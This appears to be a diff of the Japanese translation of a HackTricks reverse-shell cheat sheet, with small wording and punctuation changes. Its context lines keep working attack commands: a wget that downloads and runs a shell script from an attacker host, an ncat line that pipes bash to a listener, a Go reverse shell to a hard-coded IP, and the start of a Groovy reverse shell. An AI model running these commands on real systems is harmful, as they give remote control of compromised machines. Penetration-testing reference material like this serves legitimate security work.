@@ -15,11 +15,11 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
-**これらのシェルについて質問がある場合は、** [**https://explainshell.com/**](https://explainshell.com) **を確認してください。**
+**これらのシェルについて質問がある場合は** [**https://explainshell.com/**](https://explainshell.com) **を確認してください。**
 
 ## Full TTY
 
-**リバースシェルを取得したら、**[ **完全なTTYを取得するためにこのページを読んでください**](full-ttys.md)**。**
+**リバースシェルを取得したら**[ **完全なTTYを取得するためにこのページを読んでください**](full-ttys.md)**。**
 
 ## Bash | sh
 ```bash
@@ -60,9 +60,9 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 ```
 ## Forward Shell
 
-Linuxベースのウェブアプリケーション内の**Remote Code Execution (RCE)** 脆弱性に対処する際、リバースシェルの取得は、iptablesルールや複雑なパケットフィルタリングメカニズムなどのネットワーク防御によって妨げられることがあります。そのような制約のある環境では、PTP（擬似端末）シェルを確立して、侵害されたシステムとより効果的に対話する代替アプローチが含まれます。
+Linuxベースのウェブアプリケーション内の**Remote Code Execution (RCE)** 脆弱性に対処する際、リバースシェルの取得はiptablesルールや複雑なパケットフィルタリングメカニズムなどのネットワーク防御によって妨げられることがあります。このような制約のある環境では、妥協したシステムとより効果的に対話するためにPTY（擬似端末）シェルを確立する代替アプローチが含まれます。
 
-この目的に推奨されるツールは [toboggan](https://github.com/n3rada/toboggan.git) で、ターゲット環境との対話を簡素化します。
+この目的に推奨されるツールは[toboggan](https://github.com/n3rada/toboggan.git)で、ターゲット環境との対話を簡素化します。
 
 tobogganを効果的に利用するには、ターゲットシステムのRCEコンテキストに合わせたPythonモジュールを作成します。例えば、`nix.py`という名前のモジュールは次のように構成できます：
 ```python3
@@ -178,7 +178,7 @@ p.waitFor()
 victim> ncat <ip> <port,eg.443> --ssl  -c  "bash -i 2>&1"
 attacker> ncat -l <port,eg.443> --ssl
 ```
-## ゴーラン
+## ゴラン
 ```bash
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
 ```
@@ -316,9 +316,9 @@ xhost +targetip
 # Listen
 Xnest :1
 ```
-## Groovy
+## グルービー
 
-by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) 注：JavaリバースシェルはGroovyでも動作します
+by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) 注：Javaリバースシェルはグルービーにも適用されます
 ```bash
 String host="localhost";
 int port=8044;
@@ -342,7 +342,7 @@ GCPハッキングを学び、練習する：<img src="/.gitbook/assets/grte.png
 
 * [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
 * **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
-* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを送信してください。**
+* **[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出してハッキングトリックを共有してください。**
 
 </details>
 {% endhint %}
